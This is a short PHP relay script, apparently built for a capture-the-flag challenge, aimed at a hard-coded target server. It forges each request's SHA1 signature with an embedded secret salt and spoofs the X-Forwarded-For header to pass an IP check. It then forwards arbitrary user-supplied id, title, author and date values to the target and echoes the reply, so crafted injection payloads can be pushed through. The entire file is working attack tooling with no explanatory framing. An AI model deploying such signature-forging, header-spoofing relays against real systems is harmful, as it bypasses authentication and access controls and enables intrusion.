
<?php
//http://116.85.43.88:8080/KWPOCDSDTDPENGEV/dfe3ia/index.php
@$id = $_REQUEST['id'];
@$title = $_REQUEST['title'];
@$author = $_REQUEST['author'];
@$date = $_REQUEST['date'];
$time = time();
$sig = sha1('id='.$id.'title='.$title.'author='.$author.'date='.$date.'time='.$time.'adrefkfweodfsdpiru');

$ch = curl_init();

$post = [
    'id' => $id,
    'title' => $title,
    'author' => $author,
    'date' => $date,
];

curl_setopt($ch, CURLOPT_URL,"http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&time=$time");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'X-Forwarded-For: 123.232.23.245',
));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);

$ch_out = curl_exec($ch);
$ch_info = curl_getinfo($ch);

$header = substr($ch_out, 0, $ch_info['header_size']);
$body = substr($ch_out, $ch_info['header_size']);

http_response_code($ch_info['http_code']);
//header($header);
//echo $header;
echo $body;
